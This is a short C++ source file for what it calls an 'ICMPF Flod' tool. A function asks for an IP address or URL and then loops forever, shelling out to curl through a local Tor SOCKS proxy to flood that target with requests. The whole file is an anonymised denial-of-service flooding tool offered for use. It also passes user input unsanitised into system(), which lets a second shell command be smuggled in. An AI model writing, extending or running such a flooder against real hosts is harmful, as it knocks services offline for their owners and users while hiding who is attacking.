#include <iostream>
#include <string>
#include <sstream>
#include "resources/curly.hpp"
#include "resources/termcolor.hpp"
#include <stdlib.h>

using namespace std;
void icmpf()
{
   cout << termcolor::red;
   cout << "You need ICMPF Flod for --URL or --IP?: ";
   string urlorip;
   cin >> urlorip;
   if (urlorip == "--ip") {
     string ip;
     cout << "Enter a ip adress: ";
     cin >> ip;
     while (true) {
        system(("curl --socks5-hostname 127.0.0.1:9050 https://" + ip).c_str());
     }
   } else if (urlorip == "--url") {
        string url;
        cout << "Enter a URL adress: ";
        cin >> url;
        while (true) {
            system(("curl --socks5-hostname 127.0.0.1:9050 https://" + url).c_str());
     }
    } else {
        cout << "EROR" << endl;
        icmpf();
    }
}
